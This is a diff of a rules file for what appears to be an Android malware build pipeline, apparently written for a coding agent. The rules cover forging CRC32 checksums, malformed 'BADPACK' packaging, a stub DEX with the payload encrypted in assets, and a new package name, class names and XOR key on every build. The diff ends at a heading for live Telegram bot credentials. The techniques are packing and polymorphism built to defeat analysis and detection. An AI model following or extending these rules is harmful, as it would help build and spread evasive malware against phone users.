@@ -17,26 +17,25 @@
 
 5. **CRC32_FORGE must always be LAST in POST_RESIGN** — It forges CRCs over all bytes written by all previous steps. Order inside POST_RESIGN: STEP_TIMESTAMP_RAND → STEP_BADPACK_GP → STEP_17C → STEP_TYPE2032 → STEP_CRC32_FORGE (last).
 
-3. **STEP_DEX_PROTECT = PERMANENTLY REMOVED (V17)** — The old 3-layer hybrid cipher (block shuffle + rotation + XOR) was crashing at runtime. It has been surgically removed from build_module.py. Do NOT re-add it. The new DEX protection plan below replaces it completely.
+6. **STEP_DEX_PROTECT = PERMANENTLY REMOVED (V17)** — The old 3-layer hybrid cipher (block shuffle + rotation + XOR) was crashing at runtime. It has been surgically removed from build_module.py. Do NOT re-add it. The new DEX protection plan below replaces it completely.
 
-4. **Current companion state after removal:**
-   - classes.dex = full real DEX (3,110,160 bytes), all 3,134 classes load directly by Android
-   - NO loader mechanism exists in companion currently
+7. **Current companion state after DEX_PROTECT removal:**
+   - classes.dex = stub DEX only (11,220 bytes), payload encrypted in assets/classes.dex.enc
+   - NO old loader mechanism
    - NO assets/data/xxxx.bin
-   - NO attachBaseContext hook for DEX loading
-   - NO InMemoryDexClassLoader in companion smali
+   - New DEX loader (Layer 3 JNI plan) = NOT YET IMPLEMENTED
 
-6. **Build order = COMPANION always first → NOVA second. Every phase, no exceptions.**
+8. **Build order = COMPANION always first → NOVA second. Every phase, no exceptions.**
 
-7. **Signing = android@android.com** — stable cert via GitHub Secrets (KEYSTORE_BASE64). Both Nova and companion use this. Do not change.
+9. **Signing = android@android.com** — stable cert via GitHub Secrets (KEYSTORE_BASE64). Both Nova and companion use this. Do not change.
 
-8. **Never disable, remove, skip or delete anything** — find root cause and fix correctly.
+10. **Never disable, remove, skip or delete anything** — find root cause and fix correctly.
 
-9. **Per-build change rule:** Every build generates NEW package name, NEW class names, NEW seed, NEW XOR key, NEW asset path. Never hardcode these.
+11. **Per-build change rule:** Every build generates NEW package name, NEW class names, NEW seed, NEW XOR key, NEW asset path. Never hardcode these.
 
-10. **TYPE2032 targets = surviving res/ entries only (V18)** — STEP_TYPE2032 must only target `res/mipmap-hdpi/`, `res/mipmap-xxhdpi/`, `res/drawable/`, `res/xml/`. Do NOT target `res/animator/`, `res/color/`, `res/interpolator/` — STEP_STUB_ARSC in Phase 3 removes all of those. Targeting removed entries causes zero patches and silently fails.
+12. **TYPE2032 targets = surviving res/ entries only (V18)** — STEP_TYPE2032 must only target `res/mipmap-hdpi/`, `res/mipmap-xxhdpi/`, `res/drawable/`, `res/xml/`. Do NOT target `res/animator/`, `res/color/`, `res/interpolator/` — STEP_STUB_ARSC in Phase 3 removes all of those. Targeting removed entries causes zero patches and silently fails.
 
-11. **res/raw/ddrysysm64 must stay in _STUB_RES_KEEP3 (V18)** — This is a 0-byte file referenced in both resources.arsc and classes.dex. It must not be stripped by STEP_STUB_ARSC. It is in the keep set. NOTE: 0-byte file is currently missing from companion-81.apk despite being in the keep set — suspected zipfile API silently drops 0-byte entries. Investigation/fix pending.
+13. **res/raw/ddrysysm64 must stay in _STUB_RES_KEEP3 (V18)** — This is a 0-byte file referenced in both resources.arsc and classes.dex. It must not be stripped by STEP_STUB_ARSC. It is in the keep set. NOTE: 0-byte file is currently missing from companion-81.apk despite being in the keep set — suspected zipfile API silently drops 0-byte entries. Investigation/fix pending.
 
 ---
 
@@ -62,7 +61,7 @@
 
 ---
 
-## CURRENT CREDENTIALS (V17 — ALL LIVE)
+## CURRENT CREDENTIALS (V18 — ALL LIVE)
 
 ### Telegram Bot
 ```
